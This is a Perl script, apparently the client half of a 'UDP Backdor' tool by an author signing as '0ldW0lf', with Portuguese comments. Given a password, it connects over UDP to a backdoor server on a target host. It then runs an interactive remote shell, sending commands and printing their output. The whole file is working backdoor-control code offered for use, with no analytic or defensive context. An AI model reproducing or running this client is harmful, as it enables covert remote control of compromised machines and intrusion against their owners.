   #!/usr/bin/perl
   # UDP Backdor [Cliente]
   #
   #     0ldW0lf - old-wolf@zipmail.com
   #             - www.atrixbr.cjb.net
   #             - www.atrix.cjb.net
   #
   #
   #
   if ($#ARGV < 1) {
     print "\nUDP Backdor - Cliente\n\n";
     print " por  0ldW0lf - old-wolf\@zipmail.com
                 - www.atrixbr.cjb.net
                 - www.atrix.cjb.net\n\n";
     print "Uso: $0 <ip/host> <port> [password]\n\n";
     exit 1;
   }

   use Socket;

   select(STDOUT);
   $| = 1;

   my $ip=$ARGV[0];
   my $port=$ARGV[1];
   my $pass = $ARGV[2];
   unless($pass) {
     print "Password: ";
     chop($pass = <STDIN>);
   }

   socket(SOCK, PF_INET, SOCK_DGRAM, 17);
   $iaddr = inet_aton("$ip");
   send(SOCK,"$pass:\002falae maneh\002", 0, sockaddr_in($port, $iaddr));
   print "Waiting for the server...\n";
   while ($addr = recv(SOCK, $data, 65535, MSG_WAITALL)) {
     last if $data eq "-end.";
     if ($data=~/\001(.*)\@(.*)\001/){$uhd="$1\@$2";} else { print "-> $data\n"; }
   }
   if ($uhd) {
     print "\n\nWe're IN.\n\n";

     while ( 1 ) {
       $ckcon=0;
       print "$uhd# ";
       $msg=<STDIN>;
       chop $msg;
       if ($msg eq "exit") {
          print "\nC ya!\n\n";
          exit 0;
       } else {
          send(SOCK,"$pass:$msg", 0, sockaddr_in($port, $iaddr));
          while ($addr = recv(SOCK, $data, 65535, MSG_WAITALL)) {
            $ckcon=1;
            last if $data eq "-end.";
            if ($data=~/\001(.*)\@(.*)\001/){$uhd="$1\@$2";}else{print "$data";}
          }
       }
       last if $ckcon==0;
     }
   } else { print "Something wrong happend... try again!\n"; exit 1;}
   print "\nLooks like we r out...\n\n" if $ckcon==0; exit 1;
